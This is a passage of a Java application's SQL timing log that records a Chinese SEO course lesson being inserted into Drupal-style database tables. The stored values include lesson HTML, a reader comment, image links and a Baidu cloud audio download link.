data-slate-object="text" data-key="1560"><span data-slate-leaf="true" data-offset-key="1560:0" 
data-first-offset="true"><span data-slate-string="true">文档</span></span></span></a><span data-slate-object="text" 
data-key="1561"><span data-slate-leaf="true" data-offset-key="1561:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-49bdcde0 se-cdf077ef" 
data-slate-type="list-line" data-slate-object="block" data-key="1562"> <span data-slate-object="text" 
data-key="1563"><span data-slate-leaf="true" data-offset-key="1563:0" data-first-offset="true"><span 
data-slate-string="true">对于 PageRank 算法，互联网上其实有很多学习材料，比如维基百科的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1564" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1565"><span data-slate-leaf="true" data-offset-key="1565:0" data-first-offset="true"><span 
data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" data-key="1566"><span 
data-slate-leaf="true" data-offset-key="1566:0" data-first-offset="true"><span data-slate-string="true">，再比如科普作家卢昌海的文章——</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1567" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1568"><span data-slate-leaf="true" data-offset-key="1568:0" 
data-first-offset="true"><span data-slate-string="true">谷歌背后的数学</span></span></span></a><span 
data-slate-object="text" data-key="1569"><span data-slate-leaf="true" data-offset-key="1569:0" 
data-first-offset="true"><span data-slate-string="true">。这个算法的来源，是 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1570" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1571"><span data-slate-leaf="true" data-offset-key="1571:0" 
data-first-offset="true"><span data-slate-string="true">The Anatomy of a Large-Scale Hypertextual 
Web Search Engine</span></span></span></a><span data-slate-object="text" data-key="1572"><span 
data-slate-leaf="true" data-offset-key="1572:0" data-first-offset="true"><span data-slate-string="true"> 
这篇 Sergey Brin 和 Lawrence Page 最早写的关于 Google 搜索引擎原理的论文，当然，它并非这一讲的学习周期内要求的阅读材料，而仅供感兴趣且有余力的你阅读。</span></span></span> 
</div> <div class="se-1574f717 se-3681a6f5" data-slate-type="list-line" data-slate-object="block" 
data-key="1573"> <a data-slate-type="link" data-slate-object="inline" data-key="1574" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1575"><span data-slate-leaf="true" data-offset-key="1575:0" 
data-first-offset="true"><span data-slate-string="true">单页应用（Single Page Application）的搜索引擎优化</span></span></span></a><span 
data-slate-object="text" data-key="1576"><span data-slate-leaf="true" data-offset-key="1576:0" 
data-first-offset="true"><span data-slate-string="true">，专栏第三章已经介绍了 SPA 的优势，但是 SPA 网站并不是一个擅长将喜怒哀乐表现出来的孩子，他对擅长察言观色的搜索引擎颇不友好，因此要对 
SPA 网站进行有效的 SEO，是需要一些特殊技巧的，推荐阅读。</span></span></span> </div> </div> <div class="se-a98f2d3f" 
data-slate-type="image" data-slate-object="block" data-key="1577"> <img class="se-184879a2" 
src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 14, 14) 
 {executed in 1 msec}
2020-11-19 11:07:46.891 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.891 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:07:46.892 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.892 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:07:46.893 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755266, 1605755266, 1, 'zh-hans', 0, 1, 1, 
0, '32丨和搜索引擎的对话：SEO的原理和基础', 1, 14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.896 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=14 
 {executed in 0 msec}
2020-11-19 11:07:46.897 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:07:46.899 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755266, 1605755266, 1, 'zh-hans', 0, 
1, 1, 0, '32丨和搜索引擎的对话：SEO的原理和基础', 'book', 1, 14, 14) 
 {executed in 1 msec}
2020-11-19 11:07:46.903 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.904 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:46.905 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.906 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:46.907 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/53ea5e4328ffe1c6483cfef6b71ee649?bkt=en-d3a65691252603d3b5981eec6cc8c26dd82e31f9f1234a66423956f6bfff5d9a32cc04caba8bb426&fid=3757516097-778750-425100630089679&time=1605755265&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-ayEHZr3d3vraSoZAL%2BnPO5KRr%2F0%3D&to=92&size=14056993&sta_dx=14056993&sta_cs=3222&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1574746270&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=14056993&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-e5f947d464bd80062a5c1e5fc92d82f93bd4c10eb6a6246cf43ca281c1615cde583c07fb0e96af96&sl=76480590&expires=8h&rt=pr&r=151934116&mlogid=7502036887130794263&vbdid=2247232042&fin=32%E4%B8%A8%E5%92%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AF%B9%E8%AF%9D%EF%BC%9ASEO%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%9F%BA%E7%A1%80.m4a&bflag=92,34-92&rtype=1&dp-logid=7502036887130794263&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=2a4e4e2e8357dfbeb6a1eecaf94f682f0397166b803b9c8b&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=32%E4%B8%A8%E5%92%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AF%B9%E8%AF%9D%EF%BC%9ASEO%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%9F%BA%E7%A1%80.m4a', 
14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.913 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=14 
 {executed in 1 msec}
2020-11-19 11:07:46.913 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:46.915 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/53ea5e4328ffe1c6483cfef6b71ee649?bkt=en-d3a65691252603d3b5981eec6cc8c26dd82e31f9f1234a66423956f6bfff5d9a32cc04caba8bb426&fid=3757516097-778750-425100630089679&time=1605755265&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-ayEHZr3d3vraSoZAL%2BnPO5KRr%2F0%3D&to=92&size=14056993&sta_dx=14056993&sta_cs=3222&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1574746270&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=14056993&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-e5f947d464bd80062a5c1e5fc92d82f93bd4c10eb6a6246cf43ca281c1615cde583c07fb0e96af96&sl=76480590&expires=8h&rt=pr&r=151934116&mlogid=7502036887130794263&vbdid=2247232042&fin=32%E4%B8%A8%E5%92%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AF%B9%E8%AF%9D%EF%BC%9ASEO%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%9F%BA%E7%A1%80.m4a&bflag=92,34-92&rtype=1&dp-logid=7502036887130794263&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=2a4e4e2e8357dfbeb6a1eecaf94f682f0397166b803b9c8b&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=32%E4%B8%A8%E5%92%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AF%B9%E8%AF%9D%EF%BC%9ASEO%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%9F%BA%E7%A1%80.m4a', 
14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.946 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=14 
 {executed in 28 msec}
2020-11-19 11:07:46.947 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:46.947 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.948 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:46.949 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/f8/99/8e760987.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>許敲敲</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-22 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> 老师你好，我想了解下，我自己在github上搭建一些静态博客，使用google analytic就可以分析我网站的一些被浏览信息是嘛？ 
不知道配置这个麻烦吗，今天下班去翻个墙研究下。 </div> <!----> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 
对你说的这几个组合起来，我没有尝试过，但是技术上看，配置 Google Analytics 应该是非常简单的，一小段脚本就可以了。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span>2</span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 14, 14) 
 {executed in 0 msec}
2020-11-19 11:07:46.956 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.956 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:07:46.968 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/f8/99/8e760987.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>許敲敲</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-22 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> 老师你好，我想了解下，我自己在github上搭建一些静态博客，使用google analytic就可以分析我网站的一些被浏览信息是嘛？ 
不知道配置这个麻烦吗，今天下班去翻个墙研究下。 </div> <!----> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 
对你说的这几个组合起来，我没有尝试过，但是技术上看，配置 Google Analytics 应该是非常简单的，一小段脚本就可以了。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span>2</span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 14, 14) 
 {executed in 11 msec}
2020-11-19 11:07:46.975 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=14 
 {executed in 1 msec}
2020-11-19 11:07:46.975 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:46.976 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.976 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:46.977 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 14, 'https://static001.geekbang.org/resource/image/76/bd/76d39ef684c660a4b689e9a74eae16bd.jpg', 
14) 
 {executed in 0 msec}
2020-11-19 11:07:46.982 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:46.983 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:07:46.985 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 14, 'https://static001.geekbang.org/resource/image/76/bd/76d39ef684c660a4b689e9a74eae16bd.jpg', 
14) 
 {executed in 0 msec}
2020-11-19 11:07:46.993 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=14 
 {executed in 1 msec}
2020-11-19 11:07:46.993 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:07:46.996 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 14, 14) 
 {executed in 2 msec}
2020-11-19 11:07:47.000 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=14 
 {executed in 0 msec}
2020-11-19 11:07:47.001 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:07:47.003 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 14, 14) 
 {executed in 1 msec}
2020-11-19 11:08:37.023 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='690103975348251' 
 {executed in 1 msec}
2020-11-19 11:08:37.023 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:08:37.024 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755317, 1) 
 {executed in 0 msec}
2020-11-19 11:08:37.024 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755317, 1) 
 {executed in 0 msec}
2020-11-19 11:08:37.024 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|15            |
|--------------|

2020-11-19 11:08:37.032 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '08b1092d-709f-49f8-970b-7c53ac246699', 
15) 
 {executed in 1 msec}
2020-11-19 11:08:37.032 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '08b1092d-709f-49f8-970b-7c53ac246699', 15) 
 {executed in 0 msec}
2020-11-19 11:08:37.032 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|15            |
|--------------|

2020-11-19 11:08:37.035 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=15, revision_default=1, revision_timestamp=1605755317, 
revision_uid=1 where vid=15 
 {executed in 0 msec}
2020-11-19 11:08:37.038 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=15 
 {executed in 0 msec}
2020-11-19 11:08:37.039 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:08:37.040 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '690103975348251', 'zh-hans', 15, 15) 
 {executed in 1 msec}
2020-11-19 11:08:37.044 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=15 
 {executed in 0 msec}
2020-11-19 11:08:37.045 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:08:37.045 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '690103975348251', 'zh-hans', 15, 15) 
 {executed in 0 msec}
2020-11-19 11:08:37.050 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=15 
 {executed in 0 msec}
2020-11-19 11:08:37.051 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:08:37.051 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=15 
 {executed in 0 msec}
2020-11-19 11:08:37.052 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:08:37.053 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
